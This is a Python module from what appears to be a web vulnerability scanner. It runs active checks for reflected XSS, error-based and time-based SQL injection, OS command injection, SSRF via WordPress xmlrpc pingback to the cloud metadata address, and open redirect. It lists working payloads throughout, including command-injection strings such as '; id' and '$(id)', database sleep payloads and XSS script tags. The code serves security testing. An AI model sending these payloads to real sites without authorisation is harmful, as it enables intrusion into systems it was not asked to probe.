# Injection and active vulnerability checks.
# Everything in this module is active only, it only runs when --active is passed.

import re
import time

from colorama import Fore, Style

from utils.http import get, post
from utils.severity import finding, badge, CRITICAL, HIGH, MEDIUM, LOW


XSS_PAYLOADS = [
    "<script>alert('LOTR-XSS')</script>",
    '"><img src=x onerror=alert(1)>',
    "';alert('LOTR')//",
]

XSS_PARAMS = ["s", "q", "search", "p", "name", "comment", "message"]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "1 AND 1=1--",
    "1' ORDER BY 1--",
]

SQLI_ERROR_PATTERNS = [
    r"You have an error in your SQL syntax",
    r"Warning.*mysql_",
    r"ORA-[0-9]{4}",
    r"Microsoft OLE DB Provider",
    r"ODBC SQL Server Driver",
    r"PostgreSQL.*ERROR",
    r"SQLite.*exception",
    r"Division by zero",
    r"supplied argument is not a valid MySQL",
]

# Time-based blind SQLi payloads for the three most common backends.
# Each one asks the database to sleep for a fixed number of seconds,
# a response delay close to that duration is the signal, not error text.
SQLI_TIME_PAYLOADS = [
    ("MySQL / MariaDB", "' AND SLEEP(6)-- -"),
    ("MySQL / MariaDB", "1' AND SLEEP(6) AND '1'='1"),
    ("PostgreSQL",       "'; SELECT pg_sleep(6)-- -"),
    ("MSSQL",            "'; WAITFOR DELAY '0:0:6'-- -"),
]

SQLI_TIME_THRESHOLD_SECONDS = 5   # payload sleeps for 6s, baseline should be well under this
SQLI_BASELINE_MAX_SECONDS   = 2   # if the normal request is already slow, skip time-based testing

COMMAND_INJECTION_PAYLOADS = [
    "; id",
    "| id",
    "`id`",
    "$(id)",
    "&& whoami",
    "; whoami",
    "|| whoami",
]

# Output patterns that suggest a shell command actually ran, not just
# that our payload got reflected back unexecuted.
COMMAND_INJECTION_INDICATORS = [
    r"uid=\d+\(",           # id / whoami style output on Linux
    r"gid=\d+\(",
    r"groups=\d+\(",
    r"^root$",
    r"^www-data$",
    r"^daemon$",
]

COMMAND_INJECTION_PARAMS = ["cmd", "exec", "command", "run", "ping", "host", "ip"]

# Cloud metadata endpoint used as an SSRF test target. This is a
# well-known, deliberately non-sensitive address (link-local, not a real
# internal host), used only to confirm whether outbound requests from
# the server can be triggered, we never read the response contents.
CLOUD_METADATA_IP = "169.254.169.254"  # NOSONAR - intentional SSRF test target, not a config value

XSS_PARAM = "?{param}="


def check_reflected_xss(base_url):
    findings = []

    for payload in XSS_PAYLOADS:
        for param in XSS_PARAMS:
            url  = f"{base_url.rstrip('/')}/?{param}={payload}"
            resp = get(url)

            if resp and payload in resp.text:
                findings.append(finding(
                    title       = f"Reflected XSS via {param} Parameter",
                    severity    = HIGH,
                    description = f"The parameter '{param}' reflects unsanitised input in the response.",
                    impact      = (
                        "An attacker can craft a malicious URL that executes JavaScript in the "
                        "victim's browser, enabling session hijacking, credential theft, or malware delivery."
                    ),
                    remediation = (
                        "Sanitise and encode all user-supplied input before reflecting it in HTML "
                        "output. Use wp_kses() or esc_html() in WordPress templates."
                    ),
                    evidence    = f"Payload reflected: {payload[:80]} via ?{param}=",
                ))
                return findings

    return findings


def check_sqli_error_based(base_url):
    findings = []

    for payload in SQLI_PAYLOADS:
        url  = f"{base_url.rstrip('/')}/?s={payload}"
        resp = get(url)

        if resp is None:
            continue

        for pattern in SQLI_ERROR_PATTERNS:
            if re.search(pattern, resp.text, re.I):
                findings.append(finding(
                    title       = "SQL Injection Error Triggered via Search Parameter",
                    severity    = CRITICAL,
                    description = "A SQL error was returned when the search parameter received a SQL injection payload.",
                    impact      = (
                        "Database content may be readable or modifiable. Depending on DB "
                        "permissions, could lead to full server compromise."
                    ),
                    remediation = (
                        "Use prepared statements and parameterised queries. Ensure WP_DEBUG "
                        "is off in production to suppress error output."
                    ),
                    evidence    = f"SQL error triggered by payload: {payload}",
                ))
                return findings

    return findings


def check_sqli_time_based(base_url):
    """
    Time-based blind SQLi detection.

    Error-based detection misses cases where the app suppresses SQL errors
    but is still vulnerable. This sends payloads that ask the database to
    sleep, then checks whether the response actually took that long.

    A baseline request is timed first, if the app is already slow on its
    own, we skip this check rather than risk a false positive.
    """
    findings = []

    baseline_url  = f"{base_url.rstrip('/')}/?s=lotr_baseline_probe"
    baseline_start = time.time()
    baseline_resp  = get(baseline_url)
    baseline_time  = time.time() - baseline_start

    if baseline_resp is None:
        return findings

    if baseline_time > SQLI_BASELINE_MAX_SECONDS:
        print(f"{Fore.YELLOW}    [i] Baseline response too slow ({baseline_time:.1f}s), skipping time-based SQLi{Style.RESET_ALL}")
        return findings

    for db_engine, payload in SQLI_TIME_PAYLOADS:
        url   = f"{base_url.rstrip('/')}/?s={payload}"
        start = time.time()
        resp  = get(url, timeout=15)
        elapsed = time.time() - start

        if resp is None:
            continue

        # Response took meaningfully longer than baseline and crossed our
        # threshold, strong signal the SLEEP/WAITFOR payload actually executed.
        if elapsed >= SQLI_TIME_THRESHOLD_SECONDS and elapsed > (baseline_time * 3):
            findings.append(finding(
                title       = f"Time-Based Blind SQL Injection ({db_engine})",
                severity    = CRITICAL,
                description = (
                    f"A {db_engine} time-delay payload caused the response to take "
                    f"{elapsed:.1f}s versus a {baseline_time:.1f}s baseline, consistent "
                    f"with the injected sleep/delay command executing on the database."
                ),
                impact      = (
                    "Confirms SQL injection even where error messages are suppressed. "
                    "Database content may be extracted byte by byte using timing as a "
                    "side channel, and write access could lead to full compromise."
                ),
                remediation = (
                    "Use prepared statements and parameterised queries everywhere. "
                    "Never concatenate user input into SQL strings."
                ),
                evidence    = f"Payload: {payload} | Baseline: {baseline_time:.1f}s | Response: {elapsed:.1f}s",
            ))
            return findings  # one confirmed hit is enough evidence

    return findings


def check_command_injection(base_url):
    """
    Tests common command-injection parameter names with payloads that
    chain a harmless id/whoami call. We only flag it when the response
    contains real command output (uid=, gid=, a bare username), not just
    because the payload was reflected back unexecuted.
    """
    findings = []

    for param in COMMAND_INJECTION_PARAMS:
        for payload in COMMAND_INJECTION_PAYLOADS:
            url  = f"{base_url.rstrip('/')}/?{param}={payload}"
            resp = get(url)

            if resp is None:
                continue

            for pattern in COMMAND_INJECTION_INDICATORS:
                if re.search(pattern, resp.text, re.M):
                    findings.append(finding(
                        title       = f"OS Command Injection via '{param}' Parameter",
                        severity    = CRITICAL,
                        description = (
                            f"The parameter '{param}' appears to execute shell commands. "
                            f"Command output was found in the response after sending: {payload}"
                        ),
                        impact      = (
                            "An attacker can execute arbitrary operating system commands on "
                            "the server, this is typically full server compromise."
                        ),
                        remediation = (
                            "Never pass user input to a shell. Use language-native APIs instead "
                            "of shell commands where possible. If shelling out is unavoidable, "
                            "use strict allowlisting and parameterised subprocess calls, never "
                            "string concatenation into a shell command."
                        ),
                        evidence    = f"Payload: {payload} | Matched pattern: {pattern}",
                    ))
                    return findings

    return findings


def check_ssrf_xmlrpc(base_url):
    """
    Test SSRF via xmlrpc.php pingback.pingback to an internal address.
    We use the cloud metadata IP as the target since it's a realistic,
    well-known SSRF destination, and check only whether the request was
    accepted, not any response content.
    """
    findings = []
    url = f"{base_url.rstrip('/')}/xmlrpc.php"

    payload = f"""<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.pingback</methodName>
  <params>
    <param><value><string>http://{CLOUD_METADATA_IP}/latest/meta-data/</string></value></param>
    <param><value><string>{base_url}/</string></value></param>
  </params>
</methodCall>"""

    resp = post(url, data=payload, headers={"Content-Type": "text/xml"})

    if resp and resp.status_code == 200 and "faultCode" not in resp.text:
        findings.append(finding(
            title       = "SSRF via xmlrpc.php Pingback",
            severity    = HIGH,
            description = f"The xmlrpc.php pingback.pingback method accepted a request to an internal address ({CLOUD_METADATA_IP}).",
            impact      = (
                "An attacker can use the server as a proxy to reach internal services, "
                "cloud metadata APIs, or internal network hosts."
            ),
            remediation = "Disable xmlrpc.php if not required. If needed, disable pingback support specifically via a filter hook.",
            evidence    = f"Pingback to {CLOUD_METADATA_IP} did not return a fault response",
        ))

    return findings


def check_open_redirect(base_url):
    """
    Tests a broader set of common redirect parameter names, not just
    WordPress's redirect_to, since this check also runs against
    non-WordPress targets in web mode.
    """
    findings   = []
    param_names = ["redirect_to", "redirect", "next", "url", "return", "return_url", "continue", "dest"]
    evil_host   = "evil.example.com"

    for param in param_names:
        for path in ["", "wp-login.php"]:
            full_path = f"{base_url.rstrip('/')}/{path}" if path else base_url.rstrip("/")
            url = f"{full_path}?{param}=https://{evil_host}"
            resp = get(url, allow_redirects=False)

            if resp and resp.status_code in (301, 302, 303, 307, 308):
                location = resp.headers.get("Location", "")
                if evil_host in location:
                    findings.append(finding(
                        title       = f"Open Redirect via '{param}' Parameter",
                        severity    = MEDIUM,
                        description = f"The '{param}' parameter accepts arbitrary external URLs without validation.",
                        impact      = "Phishing attacks using legitimate-looking URLs that redirect to attacker-controlled sites.",
                        remediation = f"Validate '{param}' against a whitelist of allowed internal paths. Reject any value containing an external domain.",
                        evidence    = f"Redirect to: {location}",
                    ))
                    return findings

    return findings


def run(base_url):
    print(f"{Fore.CYAN}[*] Running injection checks (active)...{Style.RESET_ALL}")
    findings = []

    checks = [
        ("Reflected XSS",              check_reflected_xss),
        ("SQL Injection (error-based)", check_sqli_error_based),
        ("SQL Injection (time-based)",  check_sqli_time_based),
        ("Command Injection",           check_command_injection),
        ("SSRF via xmlrpc",             check_ssrf_xmlrpc),
        ("Open Redirect",               check_open_redirect),
    ]

    for label, check_fn in checks:
        results = check_fn(base_url)
        for f in results:
            findings.append(f)
            print(f"  {badge(f['severity'])} {f['title']}")

    if not findings:
        print(f"{Fore.GREEN}[+] No injection issues found{Style.RESET_ALL}")

    return findings